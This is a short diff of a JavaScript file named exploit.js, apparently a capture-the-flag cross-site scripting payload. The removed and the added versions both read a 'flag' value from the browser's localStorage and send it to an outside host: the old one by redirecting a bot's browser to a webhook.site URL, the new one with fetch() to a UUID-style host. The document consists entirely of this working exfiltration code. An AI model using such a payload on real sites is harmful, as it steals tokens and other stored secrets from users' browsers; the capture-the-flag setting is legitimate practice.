@@ -1,16 +1,2 @@
-// exploit.js
-try {
-  // Read the flag from local storage
-  var flag = window.localStorage.getItem('flag');
-
-  // print flag
-  console.log('Flag:', flag);
-  
-  // Exfiltrate the flag by navigating the bot's browser
-  // to your server. The flag will appear in your server's access logs.
-  window.location = ' 	https://webhook.site/03da09f8-364b-436d-ba9b-7dfa1d42d79f?flag=' + encodeURIComponent(flag);
-  
-} catch (e) {
-  // Handle errors
-  window.location = ' 	https://webhook.site/03da09f8-364b-436d-ba9b-7dfa1d42d79f?error=' + encodeURIComponent(e.message);
-}
+var flag = window.localStorage.getItem('flag');
+fetch('https://01b3b11a-3598-4b26-87c3-77437a26f6c4/?data=' + encodeURIComponent(flag));
